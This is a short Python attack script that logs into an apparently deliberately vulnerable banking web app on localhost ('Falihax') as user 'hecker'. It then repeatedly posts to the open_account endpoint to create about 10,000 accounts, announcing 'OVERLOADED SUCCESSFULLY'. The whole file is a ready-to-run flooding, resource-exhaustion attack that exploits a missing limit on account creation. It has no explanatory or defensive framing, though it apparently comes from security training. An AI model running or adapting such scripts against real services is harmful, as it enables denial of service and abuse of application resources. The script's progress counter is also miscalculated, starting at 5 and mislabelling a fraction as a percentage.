import requests
# import sys

def login_request_ret(session, data_:dict, loginURL: str):
    r = session.post(loginURL, 
            data = data_)
    print(r.status_code)
    if (r.status_code != 200): 
        print("Could not establish connect")
        quit()

    return r

def create_one_account(session, url:str,  acc_type:str = 'Falihax Super Saver'):
    r = session.post(url, data={'account': acc_type})
    return r


if __name__ == "__main__":
    url = 'http://127.0.0.1:5000/'
    login_url = url+'login'
    dashboard = url+'dashboard'
    open_account = url+'open_account'

    data = {
            'username' : 'hecker',
            'password' : 123456 }

    s = requests.Session()

    login_req = login_request_ret(s, data, login_url)


    # We will keep count using the database itself:
    # This will verload untill it is full and still try:

    count = 5.0

    while (count/10000 <= 1):
        coa = create_one_account(s, open_account)
        count += 1
        print(f"Created {count}/10000 account - {count/10000} % done")

    print("\n\nOVERLOADED SUCCESSFULLY :)")
